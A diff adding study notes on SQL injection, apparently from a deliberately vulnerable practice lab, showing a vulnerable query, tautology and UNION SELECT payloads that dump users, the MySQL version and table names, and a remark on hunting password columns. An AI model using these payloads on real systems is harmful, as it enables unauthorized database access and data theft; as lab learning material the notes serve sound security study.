@@ -1,0 +1,68 @@
+SQL Injection:
+It is possible when a SQL query is not coded following security rules and can
+be exploited by filling data fields of the query with extra code, manipulating
+the outcome. Here are some examples of what I could gather:
+
+Exploited query source code: "SELECT first_name, last_name FROM users WHERE user_id = $id";
+
+Content on the form field: 1 or 1=1
+This forces the query to return every user in it's database, because 1=1 is always true
+
+Result:
+First name, Surname
+admin, admin
+Gordon, Brown
+Hack, me
+Pablo, Picasso
+Bob, Smith
+
+Content: 1 or 1=1 UNION SELECT @@VERSION, @@VERSION
+This append an extra query in the current query. (The number of columns in both
+queries must match, that's why there are repetitions). This way we can get the
+version of the mysql running on the server. This information is useful because
+we can find more vulnerabilities over this.
+
+Result:
+5.1.73-1
+
+Content: 1 or 1=1 UNION SELECT TABLE_NAME, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES 
+Through the same UNION method, we get the names of every table in this
+database. With this, we get to know a bit about the structure and can formulate
+new queries to get more info.
+
+Result:
+CHARACTER_SETS
+COLLATIONS
+COLLATION_CHARACTER_SET_APPLICABILITY
+COLUMNS
+COLUMN_PRIVILEGES
+ENGINES
+EVENTS
+FILES
+GLOBAL_STATUS
+GLOBAL_VARIABLES
+KEY_COLUMN_USAGE
+PARTITIONS
+PLUGINS
+PROCESSLIST
+PROFILING
+REFERENTIAL_CONSTRAINTS
+ROUTINES
+SCHEMATA
+SCHEMA_PRIVILEGES
+SESSION_STATUS
+SESSION_VARIABLES
+STATISTICS
+TABLES
+TABLE_CONSTRAINTS
+TABLE_PRIVILEGES
+TRIGGERS
+USER_PRIVILEGES
+VIEWS
+guestbook
+users
+
+We can also try to guess columns names or retrieve them in a similar way to
+tables names above listed, getting temptating column names like "password", etc.
+(Actually, there is a column with this name, but they are hashed and therefore
+ not useful for now)
